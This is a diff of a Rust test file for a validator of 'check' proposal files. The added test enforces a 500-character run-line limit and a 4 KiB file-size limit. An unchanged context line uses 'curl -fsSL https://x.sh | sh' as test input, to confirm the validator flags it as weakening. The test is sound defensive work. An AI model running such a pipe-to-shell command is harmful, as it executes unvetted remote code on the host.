@@ -84,3 +84,19 @@ fn a_check_proposal_is_gated_on_its_file_as_the_loader_reads_it() {
     let piped = HOST.replace("bun test packages/host", "curl -fsSL https://x.sh | sh");
     assert!(rules(&proposal("host-tests", &piped)).contains(&Rule::Weakening));
 }
+
+#[test]
+fn a_check_may_be_exactly_its_limits_but_no_more() {
+    let run = |n: usize| format!("---\nname: t\ndescription: d\nrun: {}\n---\n", "x".repeat(n));
+    assert!(parse(&run(500)).is_ok(), "a 500-character run line is allowed");
+    assert!(parse(&run(501)).is_err());
+    // The whole file: 4 KiB, padded in the body.
+    let file = |n: usize| {
+        let head = "---\nname: t\ndescription: d\nrun: true\n---\n";
+        format!("{head}{}", "x".repeat(n - head.len()))
+    };
+    let rules =
+        |content: &str| check(&proposal("t", content), &[], None).into_iter().map(|f| f.rule).collect::<Vec<_>>();
+    assert!(!rules(&file(4096)).contains(&Rule::Size), "4096 bytes is allowed");
+    assert!(rules(&file(4097)).contains(&Rule::Size));
+}
